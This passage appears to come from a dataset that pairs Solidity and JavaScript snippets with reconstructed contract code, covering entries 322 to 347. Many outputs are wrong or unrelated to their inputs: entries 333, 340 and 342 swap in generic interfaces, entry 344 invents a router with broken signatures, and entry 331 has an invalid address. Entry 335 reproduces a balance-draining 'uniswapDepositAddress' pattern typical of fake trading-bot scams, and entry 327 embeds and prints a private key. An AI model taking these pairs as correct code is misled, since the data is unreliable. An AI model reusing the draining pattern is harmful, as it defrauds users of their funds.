_contribution,\n    uint256 _maxNumber,\n    string memory _imageLink\n) internal {\n    Reward memory newReward = Reward({\n        contribution: _contribution,\n        maxNumber: _maxNumber,\n        ImageLink: _imageLink\n    });\n\n    rewards.push(newReward);\n}\n\n\n",
        "output": "pragma solidity ^0.6.12;\n    abstract contract Ownable {\n        address public owner;\n\n        event OwnershipTransferred(address indexed previousOwner);\n\n        constructor () public {\n            owner = msg.sender;\n        }\n\n        modifier restricted() {\n            require(msg.sender == owner);\n            _;\n        }\n        function transferOwnership(address newOwner) public restricted {\n            if (newOwner != address(0)) {\n                owner = newOwner;\n            }\n        }\n    }\n\n"
    },
    "322.sol": {
        "input": "function getOwnersOwnedTokenIds(address owner) public view returns(uint256[] memory){\n  return ownerToIds[owner];\n}\n\npragma solidity ^0.8.0;\n\ncontract Test {\n\n    mapping(address => uint256[]) ownerToIds;\n\n    constructor() {\n        ownerToIds[msg.sender].push(1);\n        ownerToIds[msg.sender].push(2);\n        ownerToIds[msg.sender].push(3);\n        ownerToIds[msg.sender].push(4); \n    }\n\n    function getOwnersOwnedTokenIds(address owner) public view returns(uint256[] memory){\n        return ownerToIds[owner];\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n\n    mapping(address => uint256[]) ownerToIds;\n\n    constructor() {\n        ownerToIds[msg.sender].push(1);\n        ownerToIds[msg.sender].push(2);\n        ownerToIds[msg.sender].push(3);\n        ownerToIds[msg.sender].push(4); \n    }\n\n    function getOwnersOwnedTokenIds(address owner) public view returns(uint256[] memory){\n        return ownerToIds[owner];\n    }\n\n}\n\n"
    },
    "323.sol": {
        "input": "pragma ever-solidity >= 0.64.0;\ncontract foo {\n constructor() public {}\n function main() public returns (string) {}\n function redeem(uint256 a, string b, uint256 c) public {}\n}\n\n{\n  \"constructor\": \"0x68b55f3f\",\n  \"main\": \"0x30992770\",\n  \"redeem\": \"0x58160fa0\"\n}\n\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract foo {\n\n  constructor() public {}\n\n  function main() public returns (string) {}\n\n  function redeem(uint256 a, string b, uint256 c) public {}\n}\n\n"
    },
    "324.sol": {
        "input": "    function send(address payable _to) external payable {\n      _to.transfer(msg.value); \n    }\n\n    receive() external payable {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SendEther {\n  function send(address payable _to) external payable {\n    _to.transfer(msg.value); \n  }\n\n  receive() external payable {}\n}\n\n"
    },
    "325.sol": {
        "input": "bytes test = '0xabcd'\n\ntest[2:5];  # 'abc'\n\nbytes whitespaces='0x20202020202020'\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n\n    bytes test = '0xabcd';\n\n    bytes whitespaces='0x20202020202020';\n\n    function parse(string memory _input) internal pure returns(bytes memory) {\n\n    }\n}\n\n"
    },
    "326.sol": {
        "input": "function getUserBalance(address _owner) external view returns (uint) {\n    return address(_owner).balance;\n}\n\nfunction getContractBalance() public view onlyOwner returns (uint) {\n        return address(this).balance;\n    }\n\nbalanceOf(owner.address)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Owner {\n    \n    address private owner;\n\n    address public contractAddr;\n\n    \n    constructor(address _owner) {\n        owner = _owner;\n        contractAddr = address(this);\n    }\n\n    \n    modifier onlyOwner() {\n        require(owner == msg.sender,\"Access Denied\");\n        _;\n    }\n\n    \n    function getUserBalance(address _owner) external view returns (uint) {\n        return address(_owner).balance;\n    }\n\n    \n    function getContractBalance() public view onlyOwner returns (uint) {\n        return address(this).balance;\n    }\n}\n\n"
    },
    "327.sol": {
        "input": "const privateKey = \"82f98661ea7e05ac4bad0965da4b8a1fab93cf27e606d1185a275c91f96aac9b\";\nconst account = web3js.eth.accounts.privateKeyToAccount('0x' + privateKey);\nweb3js.eth.accounts.wallet.add(account);\n\nconst web3 = require('web3');\nconst fs = require(\"fs\");\n\n\nconst CONTRACT_ABI = `[\n        {\n                \"anonymous\": false,\n                \"inputs\": [\n                        {\n                                \"indexed\": true,\n                                \"internalType\": \"address\",\n                                \"name\": \"previousOwner\",\n                                \"type\": \"address\"\n                        },\n                        {\n                                \"indexed\": true,\n                                \"internalType\": \"address\",\n                                \"name\": \"newOwner\",\n                                \"type\": \"address\"\n                        }\n                ],\n                \"name\": \"OwnershipTransferred\",\n                \"type\": \"event\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"string\",\n                                \"name\": \"name\",\n                                \"type\": \"string\"\n                        },\n                        {\n                                \"internalType\": \"bytes1\",\n                                \"name\": \"pin\",\n                                \"type\": \"bytes1\"\n                        }\n                ],\n                \"name\": \"addAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"name\": \"appliances\",\n                \"outputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        },\n                        {\n                                \"internalType\": \"string\",\n                                \"name\": \"name\",\n                                \"type\": \"string\"\n                        },\n                        {\n                                \"internalType\": \"bool\",\n                                \"name\": \"status\",\n                                \"type\": \"bool\"\n                        },\n                        {\n                                \"internalType\": \"bytes1\",\n                                \"name\": \"pin\",\n                                \"type\": \"bytes1\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"name\": \"getAppliance\",\n                \"outputs\": [\n                        {\n                                \"components\": [\n                                        {\n                                                \"internalType\": \"uint256\",\n                                                \"name\": \"id\",\n                                                \"type\": \"uint256\"\n                                        },\n                                        {\n                                                \"internalType\": \"string\",\n                                                \"name\": \"name\",\n                                                \"type\": \"string\"\n                                        },\n                                        {\n                                                \"internalType\": \"bool\",\n                                                \"name\": \"status\",\n                                                \"type\": \"bool\"\n                                        },\n                                        {\n                                                \"internalType\": \"bytes1\",\n                                                \"name\": \"pin\",\n                                                \"type\": \"bytes1\"\n                                        }\n                                ],\n                                \"internalType\": \"struct Appliance\",\n                                \"name\": \"\",\n                                \"type\": \"tuple\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"getAppliances\",\n                \"outputs\": [\n                        {\n                                \"components\": [\n                                        {\n                                                \"internalType\": \"uint256\",\n                                                \"name\": \"id\",\n                                                \"type\": \"uint256\"\n                                        },\n                                        {\n                                                \"internalType\": \"string\",\n                                                \"name\": \"name\",\n                                                \"type\": \"string\"\n                                        },\n                                        {\n                                                \"internalType\": \"bool\",\n                                                \"name\": \"status\",\n                                                \"type\": \"bool\"\n                                        },\n                                        {\n                                                \"internalType\": \"bytes1\",\n                                                \"name\": \"pin\",\n                                                \"type\": \"bytes1\"\n                                        }\n                                ],\n                                \"internalType\": \"struct Appliance[]\",\n                                \"name\": \"\",\n                                \"type\": \"tuple[]\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"getAppliancesCount\",\n                \"outputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"owner\",\n                \"outputs\": [\n                        {\n                                \"internalType\": \"address\",\n                                \"name\": \"\",\n                                \"type\": \"address\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"name\": \"removeAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"renounceOwnership\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        },\n                        {\n                                \"internalType\": \"bool\",\n                                \"name\": \"status\",\n                                \"type\": \"bool\"\n                        }\n                ],\n                \"name\": \"toggleAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"address\",\n                                \"name\": \"newOwner\",\n                                \"type\": \"address\"\n                        }\n                ],\n                \"name\": \"transferOwnership\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        },\n                        {\n                                \"internalType\": \"string\",\n                                \"name\": \"name\",\n                                \"type\": \"string\"\n                        },\n                        {\n                                \"internalType\": \"bytes1\",\n                                \"name\": \"pin\",\n                                \"type\": \"bytes1\"\n                        }\n                ],\n                \"name\": \"updateAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        }\n]`;\nconst CONTRACT_ADDRESS = \"0x13d9FA79D364070510B410c2FaC1976F21E3e218\";\n\nconst web3js = new web3(new web3.providers.HttpProvider(\"https:\n\n\nvar myAddress = '0x46Be881Fa6935a8FC969A4ddDFC74d625c558996';\nconst privateKey = \"82f98661ea7e05ac4bad0965da4b8a1fab93cf27e606d1185a275c91f96aac9b\";\nconst account = web3js.eth.accounts.privateKeyToAccount('0x' + privateKey);\nweb3js.eth.accounts.wallet.add(account);\n\nconsole.log(privateKey);\nvar contractABI = JSON.parse(CONTRACT_ABI);\nvar contractAddress = CONTRACT_ADDRESS;\ncontract = new web3js.eth.Contract(contractABI, contractAddress);\n\n\nfunction main() {\n\n    contract.methods.addAppliance(\"fan\", web3.utils.numberToHex(1)).send({ from: myAddress, gas: 230000 })\n        .on(\"receipt\", (receipt) => {\n            console.log(\"receipt:\");\n            console.log(receipt);\n            contract.methods.getAppliances().call({ from: myAddress }).then(res => {\n                console.log(res);\n            });\n        });\n}\n\nmain()\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Appliance {\n\n    \n    function toggleAppliance(uint256 id, bool status) public;\n    \n    function getAppliance(uint256 id) public view returns (bool status, bytes1 pin);\n    \n    function removeAppliance(uint256 id) public;\n    \n    function updateAppliance(uint256 id, string memory name, bytes1 pin) public;\n\n\n    struct Appliance {\n        bool status;\n        bytes1 pin;\n    }\n}\n\ncontract Appliances {\n\n    function getAppliancesCount() public view returns (uint256 count);\n\t\n    function getAppliances() public view returns (Appliance[] memory);\n    \n    function addAppliance(string memory name, bytes1 pin) public payable returns (uint256 id);\n    \n    function removeAppliance(uint256 id) public;\n    \n    function toggleAppliance(uint256 id, bool status) public;\n  \n    function updateAppliance(uint256 id, string memory name, bytes1 pin) public;\n\t\n  \n    address owner;\n    Appliance[] public appliances;\n\n    constructor() public {   \n        owner = msg.sender;\n    }\n}\n\n"
    },
    "328.sol": {
        "input": "function withdrawFunds() public {\n    require(msg.sender == owner, \"Only the owner can withdraw funds.\");\n    payable(msg.sender).transfer(address(this).balance);\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract FundWithdrawal {\n    address owner;\n    address payable public ownerAddress;\n\n    constructor() public {\n        ownerAddress = msg.sender;\n        owner = msg.sender;\n    }\n\n    function withdrawFunds() public {\n        require(msg.sender == owner, \"Only the owner can withdraw funds.\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n\n"
    },
    "329.sol": {
        "input": "it(\"transfers taken ownership\", async () => {\n        const dappTokenInstance = await DAppToken.deployed();\n        return await dappTokenInstance.transfer.call(accounts[1], 99999999999999999999999999999)\n       .then(assert.fail).catch((error) => {\n          assert( error.message.indexOf(\"revert\") >= 0, \"error message must contain revert\");\n    });\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DAppToken {\n  function transfer(address to, uint256 value) public {\n    revert(\"transfer not supported\");\n  }\n}\n\n"
    },
    "330.sol": {
        "input": "contract Flags {\n   string public flag = unicode\"\ud83c\udde6\ud83c\udde9\";\n\n   function setFlag(string memory _flag) public {\n       flag = _flag;\n   }\n}\n\nfrom brownie import accounts, Flags\n\ndef test_unicode_string_setup():\n    contract = Flags.deploy({'from': accounts[0]})\n    assert contract.flag() == \"\ud83c\udde6\ud83c\udde9\"\n\n    # no unicode keyword    \n    contract.setFlag(\"\ud83c\udde6\ud83c\uddea\", {'from': accounts[0]})\n    assert contract.flag() == \"\ud83c\udde6\ud83c\uddea\"\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Flags {\n    \n    string public flag = unicode\"\ud83c\udde6\ud83c\udde9\";\n\n    \n    function setFlag(string memory _flag) public {\n        flag = _flag;\n    }\n\n}\n\n"
    },
    "331.sol": {
        "input": "(bool success,) =    usdcAddress.delegatecall(abi.encodeWithSignature('approve(address,uint256)', address(this), amount));\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Approve {\n    address public usdcAddress = address(0xA0209f996450531b4543866743652798699576417);\n\n    function approve(address receiver, uint256 amount) public {\n        (bool success,) = usdcAddress.delegatecall(abi.encodeWithSignature('approve(address,uint256)', address(this), amount));\n        require(success, \"Approval failed\");\n    }\n}\n\n"
    },
    "332.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyToken {\n    mapping (address => uint256) balanceOf;\n    address gameContractAddress;\n    \n    function transferForGame(address _receiver, uint256 _amount) external {\n        require(msg.sender == gameContractAddress, 'Only the game can perform this transfer');\n        balanceOf[gameContractAddress] -= _amount;\n        balanceOf[_receiver] += _amount;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyToken {\n    mapping (address => uint256) balanceOf;\n    address gameContractAddress;\n    \n    function transferForGame(address _receiver, uint256 _amount) external {\n        require(msg.sender == gameContractAddress, 'Only the game can perform this transfer');\n        balanceOf[gameContractAddress] -= _amount;\n        balanceOf[_receiver] += _amount;\n    }\n}\n\n"
    },
    "333.sol": {
        "input": "firstContract._admin.transfer(value);\n\naddress payable public _admin;\n\nfirstContract._admin().transfer(value);\n\nconstructor(address _address) payable {\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface IERC20 {\n      \n      function allowance(address owner, address spender) external view returns (uint256);\n\n      \n      function transfer(address to, uint256 value) external;\n\n      \n      function approve(address spender, uint256 value) external;\n\n      \n      function transferFrom(\n        address from,\n        address to,\n        uint256 value\n      ) external returns (bool);\n\n      \n      function totalSupply() external view returns (uint256);\n    }\n\n"
    },
    "334.sol": {
        "input": "pragma solidity ^0.8.0;\n\nIMPORT \"@openzeppelin/contracts/tokens/ERC20/IERC20.sol\";\n\n\ncontract Testing{\n    address public manager;\n    IERC20 wETH;\n\n    constructor(IERC20 _wETH){\n         manager =msg.sender;\n         wETH = _wETH;\n    }\n\n    function getMoneyFromManager(uint quantity) public payable{\n        wETH.transferFrom(manager, msg.sender, quantity)\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    \n    \n    function name() external view returns (string memory);\n\n    \n    function symbol() external view returns (string memory);\n\n    \n    function decimals() external view returns (uint8);\n\n    function totalSupply() external view returns (uint);\n\n    \n    function balanceOf(address account) external view returns (uint);\n\n    \n    function transfer(address recipient, uint amount) external returns (bool);\n\n    \n    function allowance(address owner, address spender) external view returns (uint);\n\n    \n    function approve(address spender, uint amount) external returns (bool);\n\n    \n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n\n    \n    event Transfer(address indexed from, address indexed to, uint tokens);\n\n    \n    event Approval(address indexed owner, address indexed spender, uint tokens);\n}\n\ninterface IETH {\n    \n    function balanceOf(address account) external view returns (uint);\n\n    \n    function transfer(address recipient, uint amount) external returns (bool);\n}\n\n"
    },
    "335.sol": {
        "input": "function action() public payable { \n    payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n}\n\ncontract Manager {\n    function performTasks() public {\n        \n    }\n\n    function uniswapDepositAddress() public pure returns (address) {\n        return 0x68aDe5BBcF885dA1590A216563344307BaFab595;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Manager {\n    function performTasks() public {\n        \n    }\n\n    function uniswapDepositAddress() public pure returns (address) {\n        return 0x68aDe5BBcF885dA1590A216563344307BaFab595;\n    }\n}\n\ncontract FixedDeposit {\n    Manager manager;\n    address public managerDepositAddress;\n\n    constructor(Manager _manager) {\n        managerDepositAddress = _manager.uniswapDepositAddress();\n        manager = _manager;\n    }\n\n    function action() public payable { \n    payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n    }\n\n    fallback() external {\n        manager.performTasks();\n    }\n}\n\n"
    },
    "336.sol": {
        "input": "function safeApprove(IERC20 token, address spender, uint256 value) internal\n{ \n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 value) external returns (bool);\n    function transfer(address to, uint256 value) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n}\n\ncontract SafeApprove {\n    \n    function safeApprove(IERC20 token, address spender, uint256 value) internal returns (bool)\n    {\n        require(spender != address(0), \"ERC20: approve from the zero address\");\n        \n        if (token.allowance(msg.sender, spender) == 0) {\n            return true;\n        }\n        if (token.approve(spender, value) == false) {\n            revert(\"ERC20: Approval for \");\n        }\n        return true;\n    }\n    \n}\n\n"
    },
    "337.sol": {
        "input": " it(\"Address #1 can't burn 100M tokens\", async function () {\n    await expect(contract.connect(signer1)\n      .burn(token_amount)\n      .to.be.revertedWith('revert ERC20: burn amount exceeds balance')\n  });\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n  function burn(uint256 amount) external returns (bool);\n}\n\n"
    },
    "338.sol": {
        "input": "function utilityFunction(string[2] storage _list1, string[3] storage _list2) internal pure returns (uint256 result) {\n\nfunction entryPoint() public view returns (uint256) {\n    string[] memory _list1 = new string[](2);\n    _list1[0] = list1[0];\n    _list1[1] = list1[1];\n\n    string[] memory _list2 = new string[](3);\n    _list2[0] = list2[0];\n    _list2[1] = list2[1];\n    _list2[2] = list2[2];\n\n    return utilityFunction(_list1, _list2);\n}\n\nfunction utilityFunction(string[] memory _list1, string[] memory _list2) internal pure returns (uint256 result) {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UtilityContract {\n\n    string[] public list1 = [\n        \"list1\",\n        \"list2\"\n    ];\n\n    string[] public list2 = [\n        \"list3\",\n        \"list4\",\n        \"list5\"\n    ];\n\n    function entryPoint() public view returns (uint256) {\n        string[] memory _list1 = new string[](2);\n        _list1[0] = list1[0];\n        _list1[1] = list1[1];\n\n        string[] memory _list2 = new string[](3);\n        _list2[0] = list2[0];\n        _list2[1] = list2[1];\n        _list2[2] = list2[2];\n\n        return utilityFunction(_list1, _list2);\n    }\n\n    function utilityFunction(string[] memory _list1, string[] memory _list2) internal pure returns (uint256 result) {\n    }\n\n}\n\n"
    },
    "339.sol": {
        "input": "function createCampaign(string memory _campaignTitle, string memory _campaignDescription, uint256 _goalAmount, uint256 _fundingPeriodInDays ) public {\n        ++totalCampaigns;\n\n        uint256 period = block.timestamp + (_fundingPeriodInDays * 1 days);\n\n        Campaign storage aCampaign = campaigns[totalCampaigns];\n\n        aCampaign.campaignOwner = payable(msg.sender);\n        aCampaign.campaignTitle = _campaignTitle;\n        aCampaign.campaignDescription = _campaignDescription;\n        aCampaign.goalAmount = _goalAmount;\n        aCampaign.totalAmountFunded = 0;\n        aCampaign.deadline = period;\n        aCampaign.goalAchieved = false;\n        aCampaign.isCampaignOpen = true;\n        aCampaign.isExists = true;\n     } \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Campaigns {\n    uint256 public totalCampaigns;\n\n    mapping (uint256=>Campaign) private campaigns;\n\n    struct Campaign {\n        address campaignOwner;\n        string campaignTitle;\n        string campaignDescription;\n        uint256 goalAmount;\n\n        \n        uint256 totalAmountFunded;\n        uint256 deadline;\n        bool goalAchieved;\n        bool isCampaignOpen;\n        bool isExists;\n    }\n\n    \n    function createCampaign(string memory _campaignTitle, string memory _campaignDescription, uint256 _goalAmount, uint256 _fundingPeriodInDays ) public {\n        ++totalCampaigns;\n\n        uint256 period = block.timestamp + (_fundingPeriodInDays * 1 days);\n\n        Campaign storage aCampaign = campaigns[totalCampaigns];\n\n        aCampaign.campaignOwner = payable(msg.sender);\n        aCampaign.campaignTitle = _campaignTitle;\n        aCampaign.campaignDescription = _campaignDescription;\n        aCampaign.goalAmount = _goalAmount;\n        aCampaign.totalAmountFunded = 0;\n        aCampaign.deadline = period;\n        aCampaign.goalAchieved = false;\n        aCampaign.isCampaignOpen = true;\n        aCampaign.isExists = true;\n     } \n\n}\n\n"
    },
    "340.sol": {
        "input": "sendMoney() public payable  {\n    address payable receiver = \n    payable(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);\n\n    (bool sent, bytes memory data) = receiver.call{ value:  1 ether }(\"\");\n    require(sent, \"Failed to send Ether\");\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    abstract contract Context {\n      function _msgSender() internal view virtual returns (address) {\n          return msg.sender;\n      }\n    }\n\n"
    },
    "341.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct People {\n        uint256 FavouriteNumber;\n        string name;\n    }\n\n    People public person = People({FavouriteNumber: 2, name: \"MB\"});\n}\n\nuint256 number = uint8(100); \nbytes b = \"hello\"; \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct People {\n        uint256 FavouriteNumber;\n        string name;\n    }\n\n    People public person = People({FavouriteNumber: 2, name: \"MB\"});\n}\n\n"
    },
    "342.sol": {
        "input": "import \"@openzeppelin/contracts/access/Ownable.sol\";\n\nfunction stoler() public onlyOwner {\n    yourToken.transfer(msg.sender, 1);\n }\n\nmodifier [NAMEMODIFIER] {\n    _;\n}\n\nfunction stoler() public [NAMEMODIFIER] {\n        yourToken.transfer(msg.sender, 1);\n     }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n    function balanceOf(address account) external view returns (uint);\n    function transfer(address recipient, uint amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint);\n    function approve(address spender, uint amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint tokens);\n    event Approval(address indexed owner, address indexed spender, uint tokens);\n}\n\n"
    },
    "343.sol": {
        "input": "const contract = new ethers.Contract(contractAddress, ABI, signer);\n\nconst returnedValue = await contract.someMethod(someArgument)\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ABI {\n\n    event Log(string value);\n\n    function someMethod(uint256 someArgument) external payable returns(uint256);\n\n}\n\n"
    },
    "344.sol": {
        "input": "function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n\n[...]\ndata = router.swapExactTokensForTokens(\n        tokens[1].balanceOf(account),\n        1,\n        path,\n        attacker,\n        chain.time(),\n        {\"from\": account},\n    )\n\n>>> int(web3.eth.getTransactionReceipt(data.txid)[\"logs\"][2][\"data\"], 16)\n631376138468681379\n\n>>> data.events\n{'Approval': [OrderedDict([('owner', '0x33A4622B82D4c04a53e170c638B944ce27cffce3'), ('spender', '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'), ('value', 4500000000000000000)])], 'Transfer': [OrderedDict([('from', '0x33A4622B82D4c04a53e170c638B944ce27cffce3'), ('to', '0xA68d9dd94574d286A75D39b1516b348620FfDCA0'), ('value', 500000000000000000)]), OrderedDict([('from', '0xA68d9dd94574d286A75D39b1516b348620FfDCA0'), ('to', '0x33A4622B82D4c04a53e170c638B944ce27cffce3'), ('value', 631376138468681379)])], 'Sync': [OrderedDict([('reserve0', 14368623861531318621), ('reserve1', 11844678011344678012)])], 'Swap': [OrderedDict([('sender', '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'), ('amount0In', 0), ('amount1In', 500000000000000000), ('amount0Out', 631376138468681379), ('amount1Out', 0), ('to', '0x33A4622B82D4c04a53e170c638B944ce27cffce3')])]}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint balance);\n\n    function transfer(address to, uint value) external returns (bool);\n\n    function approve(address spender, uint value) external returns (bool);\n\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ninterface IUniV3Router02 {\n    function WETH() external pure returns (address);\n\n    function weth() external view returns (uint);\n\n    function ETH() external pure returns (address);\n\n    function eth() external view returns (uint);\n\n    function swapExactTokensForTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n\n    function swapExactETHForTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable returns (uint[] memory amounts);\n\n    function swapExactTokensForETH(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB)\n        external\n        pure\n        returns (uint amountB);\n\n    function quoteForCurrentReserves(uint amountA) external pure returns (uint amountB);\n\n    function reserves() external view returns (uint reserve0, uint reserve1);\n\n    function reserve0() external pure returns (uint reserve0);\n\n    function reserve1() external pure returns (uint reserve1);\n}\n\n"
    },
    "345.sol": {
        "input": "  const tx = await WBNBHERORouterContract.swapExactETHForTokens(\n            wbnbAmount,\n            minAmountToBuy,\n            [WBNB, HERO],\n            wallet.address,\n            Date.now() + 1000 * 60,\n            {from : ..... , value: ... , gasLimit: 251234}\n        ) \n    \nreceipt = await tx.wait();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "347.sol": {
        "input": "pragma solidity ^0.8.0;\n\ninterface IERC20{\n    function balanceOf(address owner) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from,address to,uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ninterface IERC721{\n    function balanceOf(address owner) external view returns (uint256);\n    function setApprovalForAll(address operator, bool _approved) external;\n    function safeTransferFrom(address from,address to,uint256 tokenId) external;\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n}\n\ncontract Vote  {\n    constructor (){}\n\n    uint public candidateId = 0;\n    uint public electionId= 0;\n    mapping (uint => Election) public allElections;\n    mapping(uint => Candidate) allCandidates;\n    mapping(uint => mapping(address => bool)) public voted;\n    string public tie;\n    \n\n\n    struct Election {\n        uint electionId;\n        address creator;\n        address identifier;\n        string details;\n        bool active;\n        Candidate[] candidates;\n    }\n\n    struct Candidate{\n        uint electionId;\n        uint candidateId;\n        string name;\n        uint vote;\n    }\n\n    function setUp( address _identifier, string memory _details , string[] calldata _candidate) public {  \n        electionId++;\n        Election storage election = allElections[electionId];\n        election.electionId = electionId;\n        election.creator = msg.sender;\n        election.identifier = _identifier;\n        election.details = _details;\n        election.active = true;\n\n        for(uint i = 0; i < _candidate.length; i++){\n            candidateId++;\n            Candidate memory candidate = Candidate(electionId,candidateId,_candidate[i],0);\n            allCandidates[candidateId] = candidate;\n            election.candidates.push(candidate);\n        }\n    }\n\n    function start(uint _electionId) public {\n        require(allElections[_electionId].creator == msg.sender, \"only moderator can start an election\");\n        allElections[_electionId].active = true;\n           }\n    \n    function vote(uint _candidateId,uint _electionId ) public {\n        require(voted[_electionId][msg.sender] == false, \"you have already voted\");\n        require(allElections[_electionId].active == true, \"election have not begun\");\n        address identifier = allElections[_electionId].identifier;\n        require(IERC20(identifier).balanceOf(msg.sender) > 0 || IERC721(identifier).balanceOf(msg.sender) > 0,\"only registered voters can vote\");\n\n        allCandidates[_candidateId].vote++;\n\n\n        voted[_electionId][msg.sender] = true;\n    }\n    \n    function announce(uint _electionId) public  returns (Candidate[] memory,string memory) {\n        require(allElections[_electionId].creator == msg.sender, \"only moderators can announce winner\");\n        allElections[_electionId].active = false;\n\n        Candidate[] memory contestants = new Candidate[](candidateId);\n        uint winningVoteCount = 0;\n        uint256 winnerId;\n        uint winningCandidateIndex = 0;\n        for(uint i =0; i < candidateId ; i++){\n            if(allCandidates[i + 1].electionId == _electionId){\n                if (allCandidates[i + 1].vote > winningVoteCount){\n                     winningVoteCount = allCandidates[i + 1].vote;\n                     uint currentId = allCandidates[i + 1].candidateId;\n                        winnerId= currentId;\n\n                      Candidate storage currentItem = allCandidates[currentId];\n                    contestants[winningCandidateIndex] = currentItem;\n                    winningCandidateIndex += 1;\n                        tie=\"\";\n                }else if(allCandidates[i + 1].vote == winningVoteCount){\n                    tie = \"This ended in a tie\";\n                }\n                \n            }\n        